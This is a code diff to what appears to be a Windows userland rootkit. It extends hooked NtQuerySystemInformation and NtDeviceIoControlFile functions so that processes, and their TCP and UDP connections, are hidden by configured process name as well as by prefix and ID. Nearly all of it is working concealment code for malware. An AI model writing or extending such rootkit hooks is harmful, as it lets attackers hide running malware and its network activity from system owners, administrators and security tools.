@@ -77,7 +77,7 @@ NTSTATUS NTAPI Hooks::HookedNtQuerySystemInformation(nt::SYSTEM_INFORMATION_CLAS
 
 			for (nt::PSYSTEM_PROCESS_INFORMATION current = (nt::PSYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
 			{
-				if (Rootkit::HasPrefix(current->ImageName) || Config::IsProcessIdHidden((DWORD)(DWORD_PTR)current->ProcessId))
+				if (Rootkit::HasPrefix(current->ImageName) || Config::IsProcessIdHidden((DWORD)(DWORD_PTR)current->ProcessId) || Config::IsProcessNameHidden(current->ImageName))
 				{
 					hiddenKernelTime.QuadPart += current->KernelTime.QuadPart;
 					hiddenUserTime.QuadPart += current->UserTime.QuadPart;
@@ -340,21 +340,29 @@ NTSTATUS NTAPI Hooks::HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE even
 
 					for (DWORD i = 0; i < nsiParam->Count; i++)
 					{
+						processName[0] = L'\0';
+
 						BOOL hidden = FALSE;
 						if (nsiParam->Type == nt::NSI_PARAM_TYPE::Tcp)
 						{
+							if (processEntries) GetProcessFileName(processEntries[i].TcpProcessId, FALSE, processName, MAX_PATH);
+
 							hidden =
 								Config::IsTcpLocalPortHidden(_byteswap_ushort(tcpEntries[i].Local.Port)) ||
 								Config::IsTcpRemotePortHidden(_byteswap_ushort(tcpEntries[i].Remote.Port)) ||
 								processEntries && Config::IsProcessIdHidden(processEntries[i].TcpProcessId) ||
-								processEntries && GetProcessFileName(processEntries[i].TcpProcessId, FALSE, processName, MAX_PATH) && Rootkit::HasPrefix(processName);
+								Config::IsProcessNameHidden(processName) ||
+								Rootkit::HasPrefix(processName);
 						}
 						else if (nsiParam->Type == nt::NSI_PARAM_TYPE::Udp)
 						{
+							if (processEntries) GetProcessFileName(processEntries[i].UdpProcessId, FALSE, processName, MAX_PATH);
+
 							hidden =
 								Config::IsUdpPortHidden(_byteswap_ushort(udpEntries[i].Port)) ||
 								processEntries && Config::IsProcessIdHidden(processEntries[i].UdpProcessId) ||
-								processEntries && GetProcessFileName(processEntries[i].UdpProcessId, FALSE, processName, MAX_PATH) && Rootkit::HasPrefix(processName);
+								Config::IsProcessNameHidden(processName) ||
+								Rootkit::HasPrefix(processName);
 						}
 
 						// If hidden, move all following entries up by one and decrease count.
@@ -404,7 +412,7 @@ bool Hooks::GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGE
 
 		for (nt::PSYSTEM_PROCESS_INFORMATION current = (nt::PSYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
 		{
-			if (Rootkit::HasPrefix(current->ImageName) || Config::IsProcessIdHidden((DWORD)(DWORD_PTR)current->ProcessId))
+			if (Rootkit::HasPrefix(current->ImageName) || Config::IsProcessIdHidden((DWORD)(DWORD_PTR)current->ProcessId) || Config::IsProcessNameHidden(current->ImageName))
 			{
 				if (hiddenKernelTime) hiddenKernelTime->QuadPart += current->KernelTime.QuadPart;
 				if (hiddenUserTime) hiddenUserTime->QuadPart += current->UserTime.QuadPart;
